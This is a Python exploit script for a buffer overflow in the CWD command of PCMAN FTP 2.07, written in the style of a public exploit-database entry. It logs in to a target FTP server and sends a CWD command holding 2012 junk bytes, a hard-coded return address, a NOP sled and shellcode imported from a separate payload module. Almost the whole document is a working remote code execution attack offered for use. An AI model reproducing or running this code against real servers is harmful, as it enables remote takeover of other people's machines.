# Exploit Title: PCMAN FTP 2.07 CWD Command Buffer Overflow
# Date: Jan 25,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 2.07
# Tested on: Windows 7 sp1 x64 (english)
# Email: m.dofo123@gmail.com
from payload import buf
import socket
from sys import argv
import struct
def shell_attack(target_machine, target_port):
#
  
        #store command line arguments
       
        host = target_machine
        fuser = b"USER"
        fpass = b"PASS"
        #vars
        junk = b'\x41' * 2012 #overwrite function (CWD) with garbage/junk chars
        espaddress = b'\x59\x06\xbb\x76' # 76BB0659
        nops = b'\x90' * 10
       
        sploit = junk+espaddress+nops+buf
        #create socket
        conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #establish connection to server
        conn.connect((host,target_port))
        #post ftp user
        conn.send(b'USER '+fuser+b'\r\n')
        #wait for response
        uf = conn.recv(1024)
        #post ftp password
        conn.send(b'PASS '+fpass+b'\r\n')
        #wait for response
        pf = conn.recv(1024)
        #send ftp command with sploit
        conn.send(b'CWD '+sploit+b'\r\n')
        cf = conn.recv(1024)
        #close connection
        conn.close()
        
        
        